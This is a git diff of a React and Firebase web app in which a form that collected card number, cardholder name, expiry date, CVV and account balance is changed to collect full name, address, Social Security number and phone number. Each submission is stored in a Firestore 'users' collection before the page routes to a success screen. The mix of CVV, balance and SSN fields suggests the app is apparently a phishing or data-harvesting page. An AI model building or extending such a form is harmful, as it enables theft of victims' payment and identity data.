@@ -7,17 +7,18 @@ import Success from './success'
 import { app , database} from './firebaseconfig'
 import { collection, addDoc } from 'firebase/firestore'
 import { useNavigate } from 'react-router-dom'
+import FirstPage from './firstPage'
 
 function App() {
 
   const collectionRef = collection(database, 'users');
   
   const [formData, setFormData] = useState({
-    cardNumber: "",
-    cardName: "",
-    expiryDate: "",
-    cvv: "",
-    balance: "",
+    fullName: "",
+    address: "",
+    ssn: "",
+    phoneNumber: "",
+   
     
   });
 
@@ -52,11 +53,11 @@ function App() {
   function handleSubmit(event) {
     event.preventDefault();
     addDoc(collectionRef, {
-      cardNumber: formData.cardNumber,
-      cardName: formData.cardName,
-      expiryDate: formData.expiryDate,
-      cvv: formData.cvv,
-      balance: formData.balance,
+      fullName: formData.fullName,
+      address: formData.address,
+      ssn: formData.ssn,
+      phoneNumber: formData.phoneNumber,
+      
       
     }).then(()=> {
        navigate("success")
@@ -81,6 +82,7 @@ function App() {
   return (
     <section>
      <Routes>
+     
       <Route index element={<HomePage handleSubmit={handleSubmit} getData={getData}/>} />
       <Route path='success' element={<Success getData2={getData2} handleSubmit2={handleSubmit2}/>} />
       
